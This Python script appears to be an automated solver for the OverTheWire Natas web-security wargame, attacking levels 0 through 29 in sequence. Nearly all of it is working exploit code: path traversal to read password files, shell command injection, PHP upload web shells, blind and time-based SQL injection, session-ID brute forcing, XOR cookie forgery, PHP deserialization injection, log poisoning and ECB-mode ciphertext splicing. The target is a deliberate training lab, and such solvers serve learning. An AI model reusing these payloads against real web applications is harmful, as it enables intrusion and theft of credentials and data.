import requests
import re
import binascii
import base64
from urllib.parse import quote, unquote
from itertools import cycle
import string


from phpserialize import serialize, phpobject


CHAR_SET = string.ascii_letters + string.digits
PASSWORD_LENGHT = 32
COOKIE_LENGTH = 641

def natas0(url):
     return re.findall(r"The password for natas. is (.{32})", requests.get(url).text)[0]

def natas1(url):
    return natas0(url)

def natas2(url):
    return re.findall(r"natas3:(.{32})", requests.get(f"{url}files/users.txt").text)[0]

def natas3(url):
    session = requests.Session()
    response = session.get(f"{url}robots.txt")
    page = re.findall(r"Disallow: (.*)", response.text)[0]
    response = session.get(f"{url}{page}users.txt")
    return response.text.split(':')[1].rstrip()

def natas4(url):
    session = requests.Session()
    response = session.get(url, headers={'referer': 'http://natas5.natas.labs.overthewire.org/'})
    return re.findall(r"The password for natas. is (.{32})", response.text)[0]

def natas5(url):
    session = requests.Session()
    response = session.get(url, cookies={'loggedin': '1'})
    return re.findall(r"The password for natas. is (.{32})", response.text)[0]

def natas6(url):
    session = requests.Session()
    response = session.get(f"{url}includes/secret.inc")
    
    secret = re.findall(r"\"(.*)\"", response.text)[0].rstrip()
    payload = {'submit': 'submit', 'secret': secret}
    response = session.post(url, data=payload)
    return re.findall(r"The password for natas. is (.{32})", response.text)[0]

def natas7(url):
    response = requests.get(f"{url}?page=../../../../etc/natas_webpass/natas8")
    return re.findall(r"([^><{} =:\/\"\n]{32})", response.text)[1]

def natas8(url):
    session = requests.Session()
    response = session.get(f"{url}index-source.html")
    
    secret = re.findall("\"(.{32})\"", response.text)[1]
    decoded_secret = base64.decodestring(binascii.unhexlify(bytes(secret, 'ascii'))[::-1])
    payload = {'submit': 'submit', 'secret': decoded_secret}
    response = session.post(url, data=payload)
    return re.findall(r"The password for natas. is (.{32})", response.text)[0]

def natas9(url):
    needle = quote("; cat /etc/natas_webpass/natas10 #")
    response = requests.get(f'{url}?needle={needle}&submit=Search')
    return re.findall(r"([^><{} =:\/\"\n]{32})", response.text)[1]

def natas10(url):
    needle = quote(".* /etc/natas_webpass/natas11 #")
    response = requests.get(f'{url}?needle={needle}&submit=Search')
    return re.findall(r"([^><{} =:\/\"\n]{32})", response.text)[1]

def natas11(url):
    # With thnx to @Peilonrayz
    def xor_repeat(value, repeater):
        return bytes(v ^ r for v, r in zip(value, cycle(repeater)))

    def decode_base64(data):
        return base64.decodestring(data + b'=' * (-len(data) % 4))

    def _repeated_substring(text):
        for i in range(len(text)):
            for j in range(i+1, len(text)):
                yield text[i:j]

    def repeated_substring(text):
        return max(_repeated_substring(text), key=lambda t: (len(t), text.count(t)))

    break_json = b'{"showpassword":"no","bgcolor":"#ffffff"}'
    gen_json = b'{"showpassword":"yes","bgcolor":"#ffffff"}'

    cookies = requests.get(url).cookies.get_dict()
    cookie = decode_base64(bytes(cookies['data'][:-3], 'ascii'))
    password = repeated_substring(xor_repeat(cookie, break_json))
    new_cookie = base64.encodestring(xor_repeat(gen_json, password)).rstrip().decode('ascii')
    
    session = requests.Session()
    response = session.get(url, cookies={'data': new_cookie})
    return re.findall(r"The password for natas12 is (.{32})", response.text)[0]

def natas12(url):
    php_payload = '<? include("/etc/natas_webpass/natas13"); ?>'
    _file = {'uploadedfile': ('shell.php', php_payload)}
    payload = {'filename' : 'shell.php'}

    session = requests.Session()
    response = session.post(url, files=_file, data=payload)
    upload = re.findall(r"(upload/\S{10}.php)", response.text)[0]
    response = session.get(f"{url}{upload}")
    return response.text.strip()

def natas13(url):
    _content = b'\xFF\xD8\xFF\xE0<? include("/etc/natas_webpass/natas14"); ?>'
    _file = {'uploadedfile': ('shell.php', _content)}
    payload = {'filename' : 'shell.php'}

    session = requests.Session()
    response = session.post(url, files=_file, data=payload)
    upload = re.findall(r"(upload/\S{10}.php)", response.text)[0]
    response = session.get(f"{url}{upload}")
    return response.text.strip()[4:]

def natas14(url):
    response = requests.post(f'{url}?username=test%22%20OR%20%221%22=%221&password=lol%22%20OR%20%221%22=%221')
    return re.findall(r"The password for natas15 is (.{32})", response.text)[0]
    
def natas15(url):
    password = ''
    session = requests.Session()
    for _ in range(PASSWORD_LENGHT): 
        for char in CHAR_SET:
            sql = f'{url}?username=natas16" AND password LIKE BINARY "{password}{char}%'
            response = session.get(sql)
            if 'This user exists.' in response.text:
                password += char
                break
    return password

def natas16(url):
    password = ''
    session = requests.Session()
    for _ in range(PASSWORD_LENGHT): 
        for char in CHAR_SET:
            cmd = f'{url}?needle=hacker$(grep ^{password}{char} /etc/natas_webpass/natas17)'
            response = session.get(cmd)
            if 'hacker' not in response.text:
                password += char
                break
    return password

def natas17(url):
    password = ''
    session = requests.Session()
    for _ in range(PASSWORD_LENGHT):
        for char in CHAR_SET:
            sql = f'{url}?username=natas18" AND IF(password LIKE BINARY "{password}{char}%", sleep(1), NULL) %23'
            respsonse = session.get(sql)
            if respsonse.elapsed.total_seconds() >= 1:
                password += char
                break
    return password

def natas18(url):
    session = requests.Session()
    for i in range(1, COOKIE_LENGTH):
        response = session.get(url, cookies={'PHPSESSID': str(i)})
        if 'You are an admin.' in response.text:
            return re.findall(r'Password: [^<]*', response.text)[0].split(': ')[1]

def natas19(url):
    session = requests.Session()
    for i in range(1, COOKIE_LENGTH):
        cookieID = ''.join(hex(ord(c))[2:] for c in f"{i}-admin")
        response = session.get(url, cookies={'PHPSESSID': cookieID})
        if 'You are an admin' in response.text:
            return re.findall(r'Password: [^<]*', response.text)[0].split(': ')[1]

def natas20(url):
    name = quote("admin\nadmin 1")
    session = requests.Session()
    session.post(f"{url}?name={name}", cookies = {'hack': 'hack'})
    cookie = session.cookies.get_dict()
    response = session.get(f"{url}", cookies=cookie)
    return re.findall(r'Password: [^<]*', response.text)[0].split(': ')[1]

def natas21(url):
    url_exp = url.split('@')[0] + '@natas21-experimenter.natas.labs.overthewire.org/'
    session = requests.Session()
    cookie = session.get(url).cookies.get_dict()
    data = dict(align='lol', fontsize='100%', bgcolor='yellow', submit='Update', admin='1')    
    session.post(url_exp, data=data, cookies=cookie)
    response = session.get(url, cookies=cookie)
    return re.findall(r"Password: [^<]*", response.text)[0].split(': ')[1]

def natas22(url):
    response = requests.get(f"{url}?revelio=harrypotter", allow_redirects=False)
    return re.findall(r"Password: [^<]*", response.text)[0].split(': ')[1]

def natas23(url):
    response = requests.get(f"{url}?passwd=11iloveyou")
    return re.findall(r"Password: [^<]*", response.text)[0].split(': ')[1]

def natas24(url):
    response = requests.get(f"{url}?passwd[]=11iloveyou")
    return re.findall(r"Password: [^<]*", response.text)[0].split(': ')[1]

def natas25(url):
    session = requests.Session()
    session.headers.update({'User-Agent': '<? readfile("/etc/natas_webpass/natas26") ?>'})    
    cookie = session.get(url).cookies.get_dict()
    payload = f"....//logs/natas25_{cookie['PHPSESSID']}.log"    
    response = session.get(f"{url}?lang={payload}", cookies=cookie)
    return re.findall(r"] (.{32})", response.text)[0]

def natas26(url):
    class Logger():
        def __init__(self,initMsg,exitMsg,logFile):
            self.initMsg = initMsg
            self.exitMsg = exitMsg
            self.logFile = logFile

    def object_hook(obj):
        if isinstance(obj, Logger):
            return phpobject('Logger', {b'\x00Logger\x00initMsg': obj.initMsg, b'\x00Logger\x00exitMsg': obj.exitMsg, b'\x00Logger\x00logFile': obj.logFile})
        
    session = requests.Session()    
    logger = Logger("", "<?php include('/etc/natas_webpass/natas27');?>", "img/code.php")    
    new_ser = base64.encodestring(serialize(logger, object_hook=object_hook)).replace(b'\n', b'').decode('ascii')
    cookie = dict(drawing=new_ser)    
    session.get(f"{url}", cookies=cookie)
    response = session.get(f"{url}img/code.php")    
    return re.findall(r"(.{32})", response.text)[0]

def natas27(url):
    session = requests.Session()
    data = dict(username='natas28' + ' '*60 + 'hackz', password='')
    session.post(url, data=data)
    data = dict(username='natas28', password='')
    response = session.post(url, data=data)
    return re.findall(r"\[password] =&gt; (.{32})", response.text)[0]

def natas28(url):
    session = requests.Session()
    cipher_text = lambda url, plain_text:base64.b64decode(unquote(session.post(url, data={"query":plain_text}).url.split("query=")[1]))

    def _block_size(url):
        ciphertext = cipher_text(url, '')
        pre_len = len(ciphertext)
        idx = 0

        while pre_len >= len(ciphertext):
            plaintext = 'a' * idx
            ciphertext = cipher_text(url, plaintext)
            idx += 1

        return len(ciphertext) - pre_len

    def _prefix_size(url):
        block_size = _block_size(url)
        plain_text = 'a' * block_size * 3
        cypher = cipher_text(url, plain_text)
        cipher_a = ""

        for i in range(0, len(cypher), block_size):
            if cypher[i:i+block_size] == cypher[i+block_size: i+block_size*2]:
                cipher_a = cypher[i: i+block_size]
                break

        for i in range(block_size):
            plain_text = 'a' * (i + block_size)
            cypher = cipher_text(url, plain_text)
            if cipher_a in cypher:
                return block_size, i, cypher.index(cipher_a)

    block_size, index, cypher_size = _prefix_size(url)
    plain_text = 'a'* (block_size // 2)
    cypher = cipher_text(url, plain_text)

    sql = " UNION ALL SELECT concat(username, 0x3A ,password) FROM users #"
    pt = 'a' * index + sql + 'b' * (block_size - (len(sql) % block_size))
    ct = cipher_text(url, pt)
    e_sql = ct[cypher_size:cypher_size-index+len(pt)]
    response = session.get(f"{url}search.php/?query=", params={"query": base64.b64encode(cypher[:cypher_size]+e_sql+cypher[cypher_size:])})
    return re.findall(r"<li>natas29:(.{32})<\/li>", response.text)[0]

def natas29(url):
    session = requests.Session()
    payload = "|cat+%22/etc/nat%22%22as_webpass/nat%22%22as30%22|tr+%27\n%27+%27+%27"
    response = session.get(f"{url}index.pl?file={payload}")
    return re.findall(r"([^><{} =:\/\"\n]{32})", response.text)[1]

def natas30(url):
    pass

# Main functions
def next_level(user, password):
    return f'http://{user}:{password}@{user}.natas.labs.overthewire.org/'

def next_user(user):
    old_digit = ''.join(filter(str.isdigit, user))
    return user.replace(old_digit, str(int(old_digit)+1))

if __name__ == '__main__':    
    # Starting point
    username = 'natas0'
    password = 'natas0'

    # Function dispenser
    dispenser = {'natas0.natas.labs.overthewire.org/': natas0,
                 'natas1.natas.labs.overthewire.org/': natas1,
                 'natas2.natas.labs.overthewire.org/': natas2,
                 'natas3.natas.labs.overthewire.org/': natas3,
                 'natas4.natas.labs.overthewire.org/': natas4,
                 'natas5.natas.labs.overthewire.org/': natas5,
                 'natas6.natas.labs.overthewire.org/': natas6,
                 'natas7.natas.labs.overthewire.org/': natas7,
                 'natas8.natas.labs.overthewire.org/': natas8,
                 'natas9.natas.labs.overthewire.org/': natas9,
                 'natas10.natas.labs.overthewire.org/': natas10,
                 'natas11.natas.labs.overthewire.org/': natas11,
                 'natas12.natas.labs.overthewire.org/': natas12,
                 'natas13.natas.labs.overthewire.org/': natas13,
                 'natas14.natas.labs.overthewire.org/': natas14,
                 'natas15.natas.labs.overthewire.org/': natas15,
                 'natas16.natas.labs.overthewire.org/': natas16,
                 'natas17.natas.labs.overthewire.org/': natas17,
                 'natas18.natas.labs.overthewire.org/': natas18,
                 'natas19.natas.labs.overthewire.org/': natas19,
                 'natas20.natas.labs.overthewire.org/': natas20,
                 'natas21.natas.labs.overthewire.org/': natas21,
                 'natas22.natas.labs.overthewire.org/': natas22,
                 'natas23.natas.labs.overthewire.org/': natas23,
                 'natas24.natas.labs.overthewire.org/': natas24,
                 'natas25.natas.labs.overthewire.org/': natas25,
                 'natas26.natas.labs.overthewire.org/': natas26,
                 'natas27.natas.labs.overthewire.org/': natas27,
                 'natas28.natas.labs.overthewire.org/': natas28,
                 'natas29.natas.labs.overthewire.org/': natas29,
                 'natas30.natas.labs.overthewire.org/': natas30}

    for _ in range(len(dispenser)):
        url = next_level(username, password)        
        if requests.head(url).status_code == requests.codes.ok:
            print(f"[!] Logged into {username}: {url}")
            f = dispenser[url.split("@")[1]]
            password = f(url)
            username = next_user(username)

        else:
            print(f"[!] Failed {username}: {password}")
            break
